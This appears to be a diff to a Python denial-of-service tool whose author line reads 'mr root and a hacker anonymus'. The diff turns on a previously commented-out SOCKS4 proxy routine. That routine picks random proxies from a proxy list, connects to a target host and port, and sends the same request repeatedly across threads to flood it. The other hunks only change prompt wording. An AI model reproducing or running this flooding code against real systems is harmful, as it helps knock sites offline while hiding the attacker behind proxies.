@@ -1,6 +1,7 @@
 #!/bin/python
 # standard library
-#import socks
+import socks
+# socks library
 import socket, time, threading, random, re, urllib.request ,os, sys, asyncio
 # check modules
 _aouthor_ = 'mr root and a hacker anonymus'
@@ -79,7 +80,7 @@ while 1:
             numthreads()
     def choiceproxysocks():
         global choice3
-        choice3 = input("\n\033[31m[?] \033[36mtype \033[31m'1' \033[36mfor [http] proxy \033[20;37m| \033[36mtype \033[31m'2'\033[36m for [socks] proxy \033[31m_> \033[0m")
+        choice3 = input("\n\033[31m[?] \033[36mtype \033[31m'1' \033[36mfor [socket] proxy \033[20;37m| \033[36mtype \033[31m'2'\033[36m for [socks] proxy \033[31m_> \033[0m")
         if choice3 == "1":
             choicedownproxy()
         elif choice3 == "2":
@@ -136,7 +137,7 @@ while 1:
         except:
             while True:
                 try:
-                    print(f'\n\033[31m[!] \033[35m{out_file} not found!, please enter your file proxy.\n')
+                    print(f'\n\033[31m[!] \033[35m[{out_file}] \033[95mnot found!, please enter your file proxy.\n')
                     out_file = str(input("\n\033[31m[?] \033[36menter the proxylist \033[31m[ directory/file ] \033[36m[proxy.txt] \033[31m_> \033[0m"))
                     proxies = open(out_file, 'r').read().split()
                     break
@@ -256,20 +257,20 @@ while 1:
             else:
                 proxy = random.choice(proxies).strip().split(":")
             go.wait()
-            #try:
-                #socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True) 
-                #s = socks.socksocket()
-                #s.connect((str(url2), int(urlport)))
-                #s.send (str.encode(request))
-                #print ("\033[31m[!] \033[92mrequest sent \033[31m=> \033[20;37m" + str(proxy[0]+":"+proxy[1]) + "\033[31m @\033[20;37m", self.counter)
-                #try:
-                    #for y in range(multiple):
-                        #s.send(str.encode(request))
-                #except:
-                    #s.close()
-            #except:
-                #print ("\n\033[31m[!]\t\033[35msock down retrying request \033[31m@\033[20;37m", self.counter)
-                #s.close()
+            try:
+                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True) 
+                s = socks.socksocket()
+                s.connect((str(url2), int(urlport)))
+                s.send (str.encode(request))
+                print ("\033[31m[!] \033[92mrequest sent \033[31m=> \033[20;37m" + str(proxy[0]+":"+proxy[1]) + "\033[31m @\033[20;37m", self.counter)
+                try:
+                    for y in range(multiple):
+                        s.send(str.encode(request))
+                except:
+                    s.close()
+            except:
+                print ("\n\033[31m[!]\t\033[35msock down retrying request \033[31m@\033[20;37m", self.counter)
+                s.close()
     class RequestDefaultHTTP(threading.Thread):
         def __init__(self, counter):
             threading.Thread.__init__(self)
